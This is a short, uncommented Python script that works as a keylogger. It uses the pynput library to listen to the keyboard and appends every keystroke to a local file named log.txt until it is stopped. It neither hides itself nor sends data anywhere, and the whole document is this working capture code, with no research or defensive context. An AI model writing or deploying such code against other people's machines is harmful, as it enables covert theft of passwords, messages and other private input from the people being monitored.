import pynput

def on_press(key):
    with open('log.txt', 'a') as f:
        f.write(str(key))

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()